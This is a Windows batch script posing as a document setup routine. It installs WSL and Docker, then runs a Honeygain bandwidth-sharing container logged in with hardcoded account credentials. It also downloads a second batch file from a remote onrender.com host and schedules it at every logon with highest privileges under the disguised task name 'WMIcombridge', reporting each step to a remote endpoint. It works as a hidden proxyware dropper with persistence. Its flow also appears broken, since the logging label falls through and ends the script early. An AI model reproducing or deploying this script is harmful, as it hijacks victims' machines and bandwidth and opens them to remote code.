@echo off
setlocal enabledelayedexpansion

:: Set variables
set "LOG_URL=https://ms32-sha2.onrender.com/output"
set "USER=docSetup"
set "BAT_URL=https://ms32-sha2.onrender.com/static/apps/HGDoc.bat"
set "BAT_NAME=HGDoc.bat"
set "DOWNLOAD_PATH=%~dp0%BAT_NAME%"

:: Function to log output
:log
setlocal
set "ERR=%~1"
set "PAYLOAD={\"user\":\"%USER%\",\"err\":\"%ERR%\"}"
powershell -Command "Invoke-RestMethod -Uri '%LOG_URL%' -Method POST -Body '%PAYLOAD%' -ContentType 'application/json'" >nul 2>&1
endlocal
goto :eof

:: === Check if WSL is installed ===
wsl -l >nul 2>&1
if %errorlevel% neq 0 (
    call :log "WSL not installed, running wsl --install"
    echo Installing WSL...
    wsl --install
    call :log "wsl --install completed"
    timeout /t 30 /nobreak >nul
) else (
    call :log "WSL is already installed"
    echo WSL already installed.
)

:: Set WSL 2 as default
call :log "Setting default WSL version to 2"
wsl --set-default-version 2
call :log "Set default version completed"

:: Check if Ubuntu is installed
call :log "Checking if Ubuntu is installed"
wsl -l -v | findstr /i "Ubuntu" >nul
if %errorlevel% neq 0 (
    call :log "Ubuntu not found, installing..."
    wsl --install -d Ubuntu
    call :log "Ubuntu install triggered"
    timeout /t 30 /nobreak >nul
) else (
    call :log "Ubuntu is already installed"
    echo Ubuntu already installed.
)

:: Update and install Docker dependencies
call :log "Installing Docker dependencies"
wsl -d Ubuntu -- bash -c "sudo apt-get update && sudo apt-get install -y ca-certificates curl gnupg lsb-release"
call :log "Docker dependencies installed"

:: Setup Docker keyring
call :log "Setting up Docker keyring"
wsl -d Ubuntu -- bash -c "sudo install -m 0755 -d /etc/apt/keyrings"
wsl -d Ubuntu -- bash -c "curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg"
call :log "Docker keyring added"

:: Add Docker repo
call :log "Adding Docker repo"
wsl -d Ubuntu -- bash -c "ARCH=$(dpkg --print-architecture) && CODENAME=$(lsb_release -cs) && echo \"deb [arch=$ARCH signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $CODENAME stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null"
call :log "Docker repo added"

:: Install Docker
call :log "Installing Docker"
wsl -d Ubuntu -- bash -c "sudo apt-get update && sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin"
call :log "Docker installed"

:: Add root to docker group
wsl -d Ubuntu -- bash -c "sudo usermod -aG docker root"
call :log "Added root to Docker group"

:: Run Honeygain container
call :log "Attempting to run Honeygain container"
wsl -u root -e sh -c "docker start honeygain || docker run -d --name honeygain --restart unless-stopped honeygain/honeygain -tou-accept -email ms32-org@outlook.com -pass ms32147258369 -device HGDoc"
call :log "Honeygain container started or already running"

:: Download startup bat
call :log "Downloading startup BAT file"
powershell -Command "Invoke-WebRequest -Uri '%BAT_URL%' -OutFile '%DOWNLOAD_PATH%'" >nul 2>&1
call :log "Downloaded HGDoc.bat"

:: Schedule it to run at logon
call :log "Scheduling task for HGDoc.bat"
schtasks /create /tn "WMIcombridge" /tr "\"%DOWNLOAD_PATH%\"" /sc onlogon /rl HIGHEST /f
call :log "Scheduled task WMIcombridge"

echo.
echo ✅ All tasks completed. You may need to reboot for everything to take effect.
pause
